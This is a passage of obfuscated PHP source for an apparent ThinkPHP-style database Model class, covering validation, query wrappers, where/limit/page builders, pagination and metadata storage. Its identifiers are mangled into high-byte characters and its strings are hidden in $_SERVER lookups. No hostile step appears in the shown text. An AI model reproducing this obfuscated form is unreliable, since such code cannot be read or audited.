} $†²¿¸àä[3] = isset($†²¿¸àä[3]) ? $†²¿¸àä[3] : THINK_EXISTS_VALIDATE; $†²¿¸àä[4] = isset($†²¿¸àä[4]) ? $†²¿¸àä[4] : $«¶›ó€[371]; switch ($†²¿¸àä[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Óƒù‹¦è, $†²¿¸àä)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($«¶›ó€[12] != trim($Óƒù‹¦è[$†²¿¸àä[0]])) { if (!1 === $this->_validationField($Óƒù‹¦è, $†²¿¸àä)) { return !1; } } break; default: if (isset($Óƒù‹¦è[$†²¿¸àä[0]])) { if (!1 === $this->_validationField($Óƒù‹¦è, $†²¿¸àä)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ìï´åÑÚ, $ìÂùúÜî) { if (!1 === $this->_validationFieldItem($ìï´åÑÚ, $ìÂùúÜî)) { if ($this->patchValidate) { $this->error[$ìÂùúÜî[0]] = $ìÂùúÜî[2]; } else { $this->error = $ìÂùúÜî[2]; return !1; } } return; } protected function _validationFieldItem($šÀ€‚á , $Ìê¯ÅÆ) { $¨Å¹ä¾Ü =& $_SERVER[”ôÑ§ì¸]; switch (strtolower(trim($Ìê¯ÅÆ[4]))) { case $¨Å¹ä¾Ü[364]: case $¨Å¹ä¾Ü[365]: $éó§ÀÉµ = isset($Ìê¯ÅÆ[6]) ? (array) $Ìê¯ÅÆ[6] : array(); if (is_string($Ìê¯ÅÆ[0]) && strpos($Ìê¯ÅÆ[0], $¨Å¹ä¾Ü[50])) { $Ìê¯ÅÆ[0] = explode($¨Å¹ä¾Ü[50], $Ìê¯ÅÆ[0]); } if (is_array($Ìê¯ÅÆ[0])) { foreach ($Ìê¯ÅÆ[0] as $­¶ŒĞÓˆ) { $µˆü‡Òš[$­¶ŒĞÓˆ] = $šÀ€‚á [$­¶ŒĞÓˆ]; } array_unshift($éó§ÀÉµ, $µˆü‡Òš); } else { array_unshift($éó§ÀÉµ, $šÀ€‚á [$Ìê¯ÅÆ[0]]); } if ($¨Å¹ä¾Ü[364] == $Ìê¯ÅÆ[4]) { return call_user_func_array($Ìê¯ÅÆ[1], $éó§ÀÉµ); } else { return call_user_func_array(array(&$this, $Ìê¯ÅÆ[1]), $éó§ÀÉµ); } case $¨Å¹ä¾Ü[372]: return $šÀ€‚á [$Ìê¯ÅÆ[0]] == $šÀ€‚á [$Ìê¯ÅÆ[1]]; case $¨Å¹ä¾Ü[373]: if (is_string($Ìê¯ÅÆ[0]) && strpos($Ìê¯ÅÆ[0], $¨Å¹ä¾Ü[50])) { $Ìê¯ÅÆ[0] = explode($¨Å¹ä¾Ü[50], $Ìê¯ÅÆ[0]); } $“•¿à = array(); if (is_array($Ìê¯ÅÆ[0])) { foreach ($Ìê¯ÅÆ[0] as $­¶ŒĞÓˆ) { $“•¿à[$­¶ŒĞÓˆ] = $šÀ€‚á [$­¶ŒĞÓˆ]; } } else { $“•¿à[$Ìê¯ÅÆ[0]] = $šÀ€‚á [$Ìê¯ÅÆ[0]]; } if (!empty($šÀ€‚á [$this->getPk()])) { $“•¿à[$this->getPk()] = array($¨Å¹ä¾Ü[374], $šÀ€‚á [$this->getPk()]); } if ($this->where($“•¿à)->find()) { return !1; } return !0; default: return $this->check($šÀ€‚á [$Ìê¯ÅÆ[0]], $Ìê¯ÅÆ[1], $Ìê¯ÅÆ[4]); } } public function check($”ÂÜó™¯, $’Şı÷, $£šº„´¯ = "\162\145\147\x65\170") { $Àîíù§ =& $_SERVER[”ôÑ§ì¸]; $£šº„´¯ = strtolower(trim($£šº„´¯)); switch ($£šº„´¯) { case $Àîíù§[7]: case $Àîíù§[375]: $Ğ¯®¾¸§ = is_array($’Şı÷) ? $’Şı÷ : explode($Àîíù§[50], $’Şı÷); return $£šº„´¯ == $Àîíù§[7] ? in_array($”ÂÜó™¯, $Ğ¯®¾¸§) : !in_array($”ÂÜó™¯, $Ğ¯®¾¸§); case $Àîíù§[376]: case $Àîíù§[377]: if (is_array($’Şı÷)) { $ö¥Æç’è = $’Şı÷[0]; $¤øæğ”š = $’Şı÷[1]; } else { list($ö¥Æç’è, $¤øæğ”š) = explode($Àîíù§[50], $’Şı÷); } return $£šº„´¯ == $Àîíù§[376] ? $”ÂÜó™¯ >= $ö¥Æç’è && $”ÂÜó™¯ <= $¤øæğ”š : $”ÂÜó™¯ < $ö¥Æç’è || $”ÂÜó™¯ > $¤øæğ”š; case $Àîíù§[378]: case $Àîíù§[379]: return $£šº„´¯ == $Àîíù§[378] ? $”ÂÜó™¯ == $’Şı÷ : $”ÂÜó™¯ != $’Şı÷; case $Àîíù§[380]: $¼çÙŠÂ¨ = mb_strlen($”ÂÜó™¯, $Àîíù§[381]); if (strpos($’Şı÷, $Àîíù§[50])) { list($ö¥Æç’è, $¤øæğ”š) = explode($Àîíù§[50], $’Şı÷); return $¼çÙŠÂ¨ >= $ö¥Æç’è && $¼çÙŠÂ¨ <= $¤øæğ”š; } else { return $¼çÙŠÂ¨ == $’Şı÷; } case $Àîíù§[382]: list($ùô¨¹Å, $›Í¹Ù‘) = explode($Àîíù§[50], $’Şı÷); if (!is_numeric($ùô¨¹Å)) { $ùô¨¹Å = strtotime($ùô¨¹Å); } if (!is_numeric($›Í¹Ù‘)) { $›Í¹Ù‘ = strtotime($›Í¹Ù‘); } return NOW_TIME >= $ùô¨¹Å && NOW_TIME <= $›Í¹Ù‘; case $Àîíù§[383]: return in_array(get_client_ip(), explode($Àîíù§[50], $’Şı÷)); case $Àîíù§[384]: return !in_array(get_client_ip(), explode($Àîíù§[50], $’Şı÷)); case $Àîíù§[371]: default: return $this->regex($”ÂÜó™¯, $’Şı÷); } } public function query($Ï“ö¿‹º, $±‹áÒ‹Æ = false) { $îÆ°‡Ãä =& $_SERVER[”ôÑ§ì¸]; if (!is_bool($±‹áÒ‹Æ) && !is_array($±‹áÒ‹Æ)) { $±‹áÒ‹Æ = func_get_args(); array_shift($±‹áÒ‹Æ); } $Ï“ö¿‹º = str_replace(array($îÆ°‡Ãä[245], $îÆ°‡Ãä[385]), $îÆ°‡Ãä[53], $Ï“ö¿‹º); $Ï“ö¿‹º = $this->parseSql($Ï“ö¿‹º, $±‹áÒ‹Æ); return $this->db->query($Ï“ö¿‹º); } public function execute($ø‘Êµ˜, $Ûßû’ïÆ = false) { if (!is_bool($Ûßû’ïÆ) && !is_array($Ûßû’ïÆ)) { $Ûßû’ïÆ = func_get_args(); array_shift($Ûßû’ïÆ); } $ø‘Êµ˜ = $this->parseSql($ø‘Êµ˜, $Ûßû’ïÆ); return $this->db->execute($ø‘Êµ˜); } protected function parseSql($Íôë×‹, $¢ …®¢) { $²äŞşËÛ =& $_SERVER[”ôÑ§ì¸]; if (!0 === $¢ …®¢) { $¥Î‘ •¦ = $this->_parseOptions(); $Íôë×‹ = $this->db->parseSql($Íôë×‹, $¥Î‘ •¦); } elseif (is_array($¢ …®¢)) { $¢ …®¢ = array_map(array($this->db, $²äŞşËÛ[386]), $¢ …®¢); $Íôë×‹ = vsprintf($Íôë×‹, $¢ …®¢); } else { $Íôë×‹ = strtr($Íôë×‹, array($²äŞşËÛ[387] => $this->getTableName(), $²äŞşËÛ[388] => think_config($²äŞşËÛ[287]))); } $this->db->setModel($this->name); return $Íôë×‹; } public function db($†¹Ã¡Òñ = '', $ÏÏ„¥Çå = '', $…ÔØ±Å‹ = array()) { $ş Åìİ =& $_SERVER[”ôÑ§ì¸]; if ($ş Åìİ[12] === $†¹Ã¡Òñ && $this->db) { return $this->db; } static $î©€€´ô = array(); static $ß©Ö¦î¡ = array(); if (!isset($ß©Ö¦î¡[$†¹Ã¡Òñ]) || isset($ß©Ö¦î¡[$†¹Ã¡Òñ]) && $ÏÏ„¥Çå && $î©€€´ô[$†¹Ã¡Òñ] != $ÏÏ„¥Çå) { if (!empty($ÏÏ„¥Çå) && is_string($ÏÏ„¥Çå) && !1 === strpos($ÏÏ„¥Çå, $ş Åìİ[8])) { $ÏÏ„¥Çå = think_config($ÏÏ„¥Çå); } $†¹Ã¡Òñ = think_guid($ÏÏ„¥Çå); $ß©Ö¦î¡[$†¹Ã¡Òñ] = Db::getInstance($ÏÏ„¥Çå); } elseif (NULL === $ÏÏ„¥Çå) { $ß©Ö¦î¡[$†¹Ã¡Òñ]->close(); unset($ß©Ö¦î¡[$†¹Ã¡Òñ]); return; } if (!empty($…ÔØ±Å‹)) { if (is_string($…ÔØ±Å‹)) { parse_str($…ÔØ±Å‹, $…ÔØ±Å‹); } foreach ($…ÔØ±Å‹ as $„ñîçÛ¹ => $ııÇ½·) { $this->setProperty($„ñîçÛ¹, $ııÇ½·); } } $î©€€´ô[$†¹Ã¡Òñ] = $ÏÏ„¥Çå; $this->db = $ß©Ö¦î¡[$†¹Ã¡Òñ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $…Î­¢Â = get_class($this); if ($…Î­¢Â == $_SERVER[”ôÑ§ì¸][389]) { return $this->name; } $this->name = substr($…Î­¢Â, 0, -5); } return $this->name; } public function getTableName() { $¬÷Šã¬Æ =& $_SERVER[”ôÑ§ì¸]; if (empty($this->trueTableName)) { $»ŸÊıá® = !empty($this->tablePrefix) ? $this->tablePrefix : $¬÷Šã¬Æ[12]; if (!empty($this->tableName)) { $»ŸÊıá® .= $this->tableName; } else { $»ŸÊıá® .= think_parse_name($this->name); } $this->trueTableName = strtolower($»ŸÊıá®); } return (!empty($this->dbName) ? $this->dbName . $¬÷Šã¬Æ[10] : $¬÷Šã¬Æ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $×¥‡¡§ =& $_SERVER[”ôÑ§ì¸]; return isset($this->fields[$×¥‡¡§[294]]) ? $this->fields[$×¥‡¡§[294]] : $this->pk; } public function getDbFields() { $Êœß÷ =& $_SERVER[”ôÑ§ì¸]; if (isset($this->options[$Êœß÷[322]])) { $…‘é™»Ö = $this->db->getFields($this->options[$Êœß÷[322]]); return $…‘é™»Ö ? array_keys($…‘é™»Ö) : !1; } if ($this->fields) { $…‘é™»Ö = $this->fields; unset($…‘é™»Ö[$Êœß÷[293]], $…‘é™»Ö[$Êœß÷[294]], $…‘é™»Ö[$Êœß÷[295]], $…‘é™»Ö[$Êœß÷[292]]); return $…‘é™»Ö; } return !1; } public function data($ìÚŠ óô = '') { $ÃğûÖ²í =& $_SERVER[”ôÑ§ì¸]; if ($ÃğûÖ²í[12] === $ìÚŠ óô && !empty($this->data)) { return $this->data; } if (is_object($ìÚŠ óô)) { $ìÚŠ óô = get_object_vars($ìÚŠ óô); } elseif (is_string($ìÚŠ óô)) { parse_str($ìÚŠ óô, $ìÚŠ óô); } elseif (!is_array($ìÚŠ óô)) { think_exception(think_lang($ÃğûÖ²í[314])); } $this->data = $ìÚŠ óô; return $this; } public function join($ûë¨Ş–¿) { $û‰ˆ¥ãé =& $_SERVER[”ôÑ§ì¸]; if (is_array($ûë¨Ş–¿)) { $this->options[$û‰ˆ¥ãé[325]] = $ûë¨Ş–¿; } elseif (!empty($ûë¨Ş–¿)) { $this->options[$û‰ˆ¥ãé[325]][] = $ûë¨Ş–¿; } return $this; } public function union($Â¬˜£Ó², $™£ğ •É = false) { $Úé”ÕÏú =& $_SERVER[”ôÑ§ì¸]; if (empty($Â¬˜£Ó²)) { return $this; } if ($™£ğ •É) { $this->options[$Úé”ÕÏú[390]][$Úé”ÕÏú[391]] = !0; } if (is_object($Â¬˜£Ó²)) { $Â¬˜£Ó² = get_object_vars($Â¬˜£Ó²); } if (is_string($Â¬˜£Ó²)) { $™Ü²û¤à = $Â¬˜£Ó²; } elseif (is_array($Â¬˜£Ó²)) { if (isset($Â¬˜£Ó²[0])) { $this->options[$Úé”ÕÏú[390]] = array_merge($this->options[$Úé”ÕÏú[390]], $Â¬˜£Ó²); return $this; } else { $™Ü²û¤à = $Â¬˜£Ó²; } } else { think_exception(think_lang($Úé”ÕÏú[314])); } $this->options[$Úé”ÕÏú[390]][] = $™Ü²û¤à; return $this; } public function cache($»¶ŸÃÒ¦ = true, $şŞ£ó¹Æ = null, $´Öì×´µ = '') { $àç¥¡Ğ‚ =& $_SERVER[”ôÑ§ì¸]; if (!1 !== $»¶ŸÃÒ¦) { $this->options[$àç¥¡Ğ‚[392]] = array($àç¥¡Ğ‚[94] => $»¶ŸÃÒ¦, $àç¥¡Ğ‚[382] => $şŞ£ó¹Æ, $àç¥¡Ğ‚[33] => $´Öì×´µ); } return $this; } public function field($şÀº³â‚, $²äş¹ğ = false) { $Ï„Šî´÷ =& $_SERVER[”ôÑ§ì¸]; if (!0 === $şÀº³â‚) { $ƒˆ›‡ì = $this->getDbFields(); $şÀº³â‚ = $ƒˆ›‡ì ? $ƒˆ›‡ì : $Ï„Šî´÷[202]; } elseif ($²äş¹ğ) { if (is_string($şÀº³â‚)) { $şÀº³â‚ = explode($Ï„Šî´÷[50], $şÀº³â‚); } $ƒˆ›‡ì = $this->getDbFields(); $şÀº³â‚ = $ƒˆ›‡ì ? array_diff($ƒˆ›‡ì, $şÀº³â‚) : $şÀº³â‚; } $this->options[$Ï„Šî´÷[316]] = $şÀº³â‚; return $this; } public function scope($õó›ª ã = '', $Ì¯¼ØÛ = NULL) { $á¸ÓêØÚ =& $_SERVER[”ôÑ§ì¸]; if ($á¸ÓêØÚ[12] === $õó›ª ã) { if (isset($this->_scope[$á¸ÓêØÚ[37]])) { $í‚×˜‡ = $this->_scope[$á¸ÓêØÚ[37]]; } else { return $this; } } elseif (is_string($õó›ª ã)) { $Êõ³„àê = explode($á¸ÓêØÚ[50], $õó›ª ã); $í‚×˜‡ = array(); foreach ($Êõ³„àê as $¯’€İğÌ) { if (!isset($this->_scope[$¯’€İğÌ])) { continue; } $í‚×˜‡ = array_merge($í‚×˜‡, $this->_scope[$¯’€İğÌ]); } if (!empty($Ì¯¼ØÛ) && is_array($Ì¯¼ØÛ)) { $í‚×˜‡ = array_merge($í‚×˜‡, $Ì¯¼ØÛ); } } elseif (is_array($õó›ª ã)) { $í‚×˜‡ = $õó›ª ã; } if (is_array($í‚×˜‡) && !empty($í‚×˜‡)) { $this->options = array_merge($this->options, array_change_key_case($í‚×˜‡)); } return $this; } public function where($¼ ²‘ƒŠ, $ûñÒÔä“ = null) { $²çÒ‘³³ =& $_SERVER[”ôÑ§ì¸]; if (!is_null($ûñÒÔä“) && is_string($¼ ²‘ƒŠ)) { if (!is_array($ûñÒÔä“)) { $ûñÒÔä“ = func_get_args(); array_shift($ûñÒÔä“); } $ûñÒÔä“ = array_map(array($this->db, $²çÒ‘³³[386]), $ûñÒÔä“); $¼ ²‘ƒŠ = vsprintf($¼ ²‘ƒŠ, $ûñÒÔä“); } elseif (is_object($¼ ²‘ƒŠ)) { $¼ ²‘ƒŠ = get_object_vars($¼ ²‘ƒŠ); } elseif (is_array($¼ ²‘ƒŠ)) { foreach ($¼ ²‘ƒŠ as $¾‰‚‘½— => $¿Åõˆê…) { if ((is_numeric($¾‰‚‘½—) || !$¾‰‚‘½—) && is_string($¿Åõˆê…)) { if (strpos($¿Åõˆê…, $²çÒ‘³³[393]) === 0) { continue; } think_trace($²çÒ‘³³[394], $²çÒ‘³³[12], $²çÒ‘³³[49]); die; } } } if (is_string($¼ ²‘ƒŠ) && $²çÒ‘³³[12] != $¼ ²‘ƒŠ) { $­éŞèÑü = array(); $­éŞèÑü[$²çÒ‘³³[395]] = $¼ ²‘ƒŠ; $¼ ²‘ƒŠ = $­éŞèÑü; } if (isset($this->options[$²çÒ‘³³[318]])) { $this->options[$²çÒ‘³³[318]] = array_merge($this->options[$²çÒ‘³³[318]], $¼ ²‘ƒŠ); } else { $this->options[$²çÒ‘³³[318]] = $¼ ²‘ƒŠ; } return $this; } public function limit($ß™„àÄÁ, $¦²öŒÏ = null) { $‡Ñ’Ø­ =& $_SERVER[”ôÑ§ì¸]; $this->options[$‡Ñ’Ø­[335]] = is_null($¦²öŒÏ) ? $ß™„àÄÁ : $ß™„àÄÁ . $‡Ñ’Ø­[50] . $¦²öŒÏ; return $this; } public function page($‰‚Ÿ³, $²åïåÒ‹ = null) { $·è›Ü»‡ =& $_SERVER[”ôÑ§ì¸]; $this->options[$·è›Ü»‡[396]] = is_null($²åïåÒ‹) ? $‰‚Ÿ³ : $‰‚Ÿ³ . $·è›Ü»‡[50] . $²åïåÒ‹; return $this; } public function comment($™ª¶²å¿) { $this->options[$_SERVER[”ôÑ§ì¸][397]] = $™ª¶²å¿; return $this; } public function setProperty($™à“¥´, $¯ççß¥) { if (property_exists($this, $™à“¥´)) { $this->{$™à“¥´} = $¯ççß¥; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\x66\171\124\x69\155\145", "\x74\151\155\x65", "\151\x6e\163\145\x72\164\x2c\165\x70\x64\x61\164\145", "\146\x75\x6e\x63\164\x69\157\x6e"), array("\x63\x72\145\x61\164\145\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\x73\145\x72\164", "\x66\165\x6e\143\164\x69\157\156")); public function setDataAuto($Ô‚£·) { $this->dataAuto = $Ô‚£·; } public function __construct($Ûß×öÜ¾ = '', $şñ¤£®ı = '', $ÎßÍÊ«‡ = '') { parent::__construct($Ûß×öÜ¾, $şñ¤£®ı, $ÎßÍÊ«‡); } protected $tableMeta = array(); protected function _beforeInsert(&$ßÇˆªÕë, $¬­ÍÓäØ) { $Æ’ë×ƒÄ =& $_SERVER[”ôÑ§ì¸]; if (!$this->checkDataAutoHas($Æ’ë×ƒÄ[398])) { return; } $this->dataBeforeFilter($ßÇˆªÕë, $Æ’ë×ƒÄ[398]); } protected function _beforeUpdate(&$ôîÍñ¡ú, $™üŒ÷äº) { $Ù¾åÏğ =& $_SERVER[”ôÑ§ì¸]; if (!$this->checkDataAutoHas($Ù¾åÏğ[399])) { return; } $this->dataBeforeFilter($ôîÍñ¡ú, $Ù¾åÏğ[399]); } protected function _afterSelect(&$ÅÀ”óÈÆ, $Ç¥ÄşĞÊ) { if (!is_array($ÅÀ”óÈÆ)) { return; } if (!$this->checkDataAutoHas($_SERVER[”ôÑ§ì¸][400])) { return; } foreach ($ÅÀ”óÈÆ as &$Øşé–•²) { $this->dataAfterFilter($Øşé–•²); } unset($Øşé–•²); } protected function _afterFind(&$æœ£ÎÛ½, $˜ï§„Ì¹) { if (!is_array($æœ£ÎÛ½)) { return; } if (!$this->checkDataAutoHas($_SERVER[”ôÑ§ì¸][400])) { return; } $this->dataAfterFilter($æœ£ÎÛ½); } public static function textEncode($±”Ö¯òÈ) { if (!$±”Ö¯òÈ) { return $±”Ö¯òÈ; } $Êçµù”‚ = json_encode($±”Ö¯òÈ); $Êçµù”‚ = preg_replace_callback($_SERVER[”ôÑ§ì¸][401], function ($­¨’´‡) { return addslashes($­¨’´‡[0]); }, $Êçµù”‚); return json_decode($Êçµù”‚); } public static function textDecode($¯¾¬„İñ) { $ÄïÏ¡£è =& $_SERVER[”ôÑ§ì¸]; $×Ì›ÔÒ™ = json_encode($¯¾¬„İñ); $×Ì›ÔÒ™ = preg_replace_callback($ÄïÏ¡£è[402], function ($ç¸…½·æ) { return $_SERVER[”ôÑ§ì¸][97]; }, $×Ì›ÔÒ™); return json_decode($×Ì›ÔÒ™); } public function setAutoIncrement($ÃªŒ’ñş) { $‚×Çİ¿ = array($this->getPk() => $ÃªŒ’ñş); $Ë…ü¸™ = $this->data($‚×Çİ¿)->add(); if ($Ë…ü¸™) { $this->delete($Ë…ü¸™); } } public function getAutoIncrement() { $ö¥“Ëí = $this->getTableName(); $¥†•èè¬ = $this->max($this->getPk()); $—²¨ÓÍÊ = $this->query("\x73\x68\x6f\167\x20\x74\x61\x62\154\145\40\x73\164\x61\164\165\x73\x20\x77\x68\145\x72\x65\x20\116\141\x6d\x65\x3d\47{$ö¥“Ëí}\x27"); $ÆÙÈÔ¯™ = $—²¨ÓÍÊ[0][$_SERVER[”ôÑ§ì¸][403]]; $æŸÜÚ•¥ = max($¥†•èè¬, $ÆÙÈÔ¯™); return $æŸÜÚ•¥; } protected function _callBefore($¦ÈáÔĞö, $ãöîÚŠš) { return $this->cacheCallCheck($¦ÈáÔĞö, $ãöîÚŠš, !1); } protected function _callAfter($¿…ù¥³, $¶ôø±€) { return $this->cacheCallCheck($¿…ù¥³, $¶ôø±€, !0); } protected function cacheFunctionAlias($³Ø‚ø©²) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($óöàÎ, $À¯—±¯, $Ôµ¼ŞÇÓ = false) { $Êœ»ıÄ† = $this->cacheFunctionAlias($À¯—±¯); if (!$Êœ»ıÄ†) { return; } foreach ($Êœ»ıÄ† as $¬Š­àêô => $ÏíÇÆéÛ) { $²Î•· = $ÏíÇÆéÛ[0]; $¡éÔÕŠ¯ = explode($_SERVER[”ôÑ§ì¸][50], $ÏíÇÆéÛ[1]); if ($óöàÎ == $¬Š­àêô) { return $this->cacheFunctionGet($¬Š­àêô, $²Î•·); } if ($Ôµ¼ŞÇÓ && in_array($óöàÎ, $¡éÔÕŠ¯)) { $this->cacheFunctionClear($¬Š­àêô, $²Î•·); } } } public function cacheFunctionGet($›‘àõ, $¾Õû–Ü) { $Ì¿–Íë = $this->cacheKeyMake($›‘àõ, $¾Õû–Ü); $İè–ºíÓ = Cache::get($Ì¿–Íë); if (!is_array($İè–ºíÓ)) { $İè–ºíÓ = call_user_func_array(array($this, $›‘àõ), array($¾Õû–Ü, !0)); Cache::set($Ì¿–Íë, $İè–ºíÓ); } return $İè–ºíÓ; } public function cacheFunctionClear($‹ æâàÆ, $µöÆŒÛ) { $§Ôš‘Üî = $µöÆŒÛ; if (!is_array($µöÆŒÛ)) { $§Ôš‘Üî = array($µöÆŒÛ); } foreach ($§Ôš‘Üî as $ĞÆÓ©å’) { $ÍĞ©¡£ = $this->cacheKeyMake($‹ æâàÆ, $ĞÆÓ©å’); Cache::remove($ÍĞ©¡£); } } private function cacheKeyMake($å´öÜÜ‡, $‘ªûŞºÁ) { $¤¶‡Ù°Û =& $_SERVER[”ôÑ§ì¸]; return get_class($this) . $¤¶‡Ù°Û[11] . $å´öÜÜ‡ . $¤¶‡Ù°Û[404] . $‘ªûŞºÁ; } protected function selectPageReset() { $òùéıÍ¾ =& $_SERVER[”ôÑ§ì¸]; if (isset($GLOBALS[$òùéıÍ¾[405]])) { return; } $GLOBALS[$òùéıÍ¾[405]] = isset($GLOBALS[$òùéıÍ¾[7]][$òùéıÍ¾[406]]) ? $GLOBALS[$òùéıÍ¾[7]][$òùéıÍ¾[406]] : !1; $GLOBALS[$òùéıÍ¾[407]] = isset($GLOBALS[$òùéıÍ¾[7]][$òùéıÍ¾[396]]) ? $GLOBALS[$òùéıÍ¾[7]][$òùéıÍ¾[396]] : !1; $GLOBALS[$òùéıÍ¾[7]][$òùéıÍ¾[406]] = !1; $GLOBALS[$òùéıÍ¾[7]][$òùéıÍ¾[396]] = !1; } protected function selectPageRestore() { $‰µ”åô¦ =& $_SERVER[”ôÑ§ì¸]; if (!isset($GLOBALS[$‰µ”åô¦[405]])) { return; } $GLOBALS[$‰µ”åô¦[7]][$‰µ”åô¦[406]] = $GLOBALS[$‰µ”åô¦[405]]; $GLOBALS[$‰µ”åô¦[7]][$‰µ”åô¦[396]] = $GLOBALS[$‰µ”åô¦[407]]; if ($GLOBALS[$‰µ”åô¦[7]][$‰µ”åô¦[406]] === !1) { unset($GLOBALS[$‰µ”åô¦[7]][$‰µ”åô¦[406]]); } if ($GLOBALS[$‰µ”åô¦[7]][$‰µ”åô¦[396]] === !1) { unset($GLOBALS[$‰µ”åô¦[7]][$‰µ”åô¦[396]]); } unset($GLOBALS[$‰µ”åô¦[405]]); unset($GLOBALS[$‰µ”åô¦[407]]); } protected function selectPage($í¦·Èó¦ = 200, $ÒÎü¸Ê¬ = 1) { $ÆÂ³æ‹“ =& $_SERVER[”ôÑ§ì¸]; global $in; $¯Ú“¬Ú = $this->optionsValue(); $õß±˜Éá = 50000; $í¦·Èó¦ = isset($in[$ÆÂ³æ‹“[406]]) && $in[$ÆÂ³æ‹“[406]] ? $in[$ÆÂ³æ‹“[406]] : $í¦·Èó¦; if ($í¦·Èó¦ === -1) { $in[$ÆÂ³æ‹“[406]] = !1; $õß±˜Éá = 100000000; $í¦·Èó¦ = $õß±˜Éá; } $¹áó = $¯Ú“¬Ú; $¹áó[$ÆÂ³æ‹“[408]] = array(); $í¦·Èó¦ = intval($í¦·Èó¦); $í¦·Èó¦ = $í¦·Èó¦ <= 5 ? 5 : ($í¦·Èó¦ >= $õß±˜Éá ? $õß±˜Éá : $í¦·Èó¦); $ÒÎü¸Ê¬ = intval(isset($in[$ÆÂ³æ‹“[396]]) && $in[$ÆÂ³æ‹“[396]] ? $in[$ÆÂ³æ‹“[396]] : $ÒÎü¸Ê¬); $ÒÎü¸Ê¬ = $ÒÎü¸Ê¬ <= 1 ? 1 : $ÒÎü¸Ê¬; $Ô’¬üãÙ = array(); $šÀ³Ã´ü = 1; if ($ÒÎü¸Ê¬ == 1 && $šÀ³Ã´ü) { $this->optionsValue($¯Ú“¬Ú); $Ô’¬üãÙ = $this->page($ÒÎü¸Ê¬, $í¦·Èó¦)->select(); $„—ÀÒ½¬ = is_array($Ô’¬üãÙ) ? count($Ô’¬üãÙ) : 0; if ($„—ÀÒ½¬ < $í¦·Èó¦) { $âœôİ’É = 1; } else { $this->optionsValue($¹áó); $„—ÀÒ½¬ = intval($this->count()); $âœôİ’É = ceil($„—ÀÒ½¬ / $í¦·Èó¦); } } else { $this->optionsValue($¹áó); $„—ÀÒ½¬ = intval($this->count()); $âœôİ’É = ceil($„—ÀÒ½¬ / $í¦·Èó¦); $ÒÎü¸Ê¬ = $ÒÎü¸Ê¬ >= $âœôİ’É ? $âœôİ’É : $ÒÎü¸Ê¬; $this->optionsValue($¯Ú“¬Ú); $Ô’¬üãÙ = $this->page($ÒÎü¸Ê¬, $í¦·Èó¦)->select(); } if (!is_array($Ô’¬üãÙ)) { $Ô’¬üãÙ = array(); } if ($âœôİ’É == 1) { $„—ÀÒ½¬ = count($Ô’¬üãÙ); } $ôšÛÂ¯‡ = array($ÆÂ³æ‹“[409] => array($ÆÂ³æ‹“[410] => $„—ÀÒ½¬, $ÆÂ³æ‹“[406] => $í¦·Èó¦, $ÆÂ³æ‹“[396] => $ÒÎü¸Ê¬, $ÆÂ³æ‹“[411] => $âœôİ’É), $ÆÂ³æ‹“[412] => $Ô’¬üãÙ); return $ôšÛÂ¯‡; } protected function checkLength($øÆ®€Ù¯, $·Ñ…¢²• = 0, $»«¬áÎ = '') { $’ŞÆ…õ =& $_SERVER[”ôÑ§ì¸]; $·Ñ…¢²• = $·Ñ…¢²• ? $·Ñ…¢²• : 65536; if (!$øÆ®€Ù¯ || strlen($øÆ®€Ù¯) < $·Ñ…¢²•) { return; } $»«¬áÎ = $»«¬áÎ ? $»«¬áÎ . $’ŞÆ…õ[71] : $’ŞÆ…õ[12]; show_json($»«¬áÎ . LNG($’ŞÆ…õ[413]) . "\x28{$·Ñ…¢²•}\x29", !1); } protected function metaSet($ØæĞû®, $ÊÚŠú = null, $ç”àŸ¦¨ = null) { $˜ë¼ò»Í =& $_SERVER[”ôÑ§ì¸]; if (!$this->tableMeta || !$ØæĞû®) { return !1; } $å²ØÈÌû = $this->tableMeta[$˜ë¼ò»Í[414]]; $Ï¾ ‰ÒÑ = $this->tableMeta[$˜ë¼ò»Í[415]]; $Ä¾º•Õ¾ = Model($Ï¾ ‰ÒÑ); $ï­¬¿Ö• = array($å²ØÈÌû => $ØæĞû®, $˜ë¼ò»Í[416] => $ÊÚŠú); if (is_null($ÊÚŠú)) { return $Ä¾º•Õ¾->where(array($å²ØÈÌû => $ØæĞû®))->delete(); } if (is_null($ç”àŸ¦¨) && is_string($ÊÚŠú)) { return $Ä¾º•Õ¾->where($ï­¬¿Ö•)->delete(); } $”ÆƒÎĞÇ = is_array($ÊÚŠú) ? $ÊÚŠú : array(); if (is_string($ÊÚŠú)) { $”ÆƒÎĞÇ[$ÊÚŠú] = $ç”àŸ¦¨; } $ƒ²ÃÒËğ = array(); foreach ($”ÆƒÎĞÇ as $¯ÏáÔ ´ => $ë”Ö„) { if (is_null($ë”Ö„) && is_string($¯ÏáÔ ´)) { $Ä¾º•Õ¾->where(array($å²ØÈÌû => $ØæĞû®, $˜ë¼ò»Í[416] => $¯ÏáÔ ´))->delete(); continue; } $this->checkLength($ë”Ö„, !1, $Ï¾ ‰ÒÑ . $˜ë¼ò»Í[4] . $¯ÏáÔ ´); $ƒ²ÃÒËğ[] = array($å²ØÈÌû => $ØæĞû®, $˜ë¼ò»Í[94] => $¯ÏáÔ ´, $˜ë¼ò»Í[417] => $ë”Ö„); } $ôïò‹Ï = $˜ë¼ò»Í[418] . $Ï¾ ‰ÒÑ; CacheLock::lock($ôïò‹Ï); $Ä¾º•Õ¾->where(array($å²ØÈÌû => $ØæĞû®))->addAll($ƒ²ÃÒËğ, array(), !0); CacheLock::unlock($ôïò‹Ï); return !0; } public function metaGet($ê–ü„ÄÓ, $Æ³±Ÿà£ = false) { $äÁ¾ú™ı =& $_SERVER[”ôÑ§ì¸]; if (!$this->tableMeta) { return array(); } $¶ğğ‘çö = 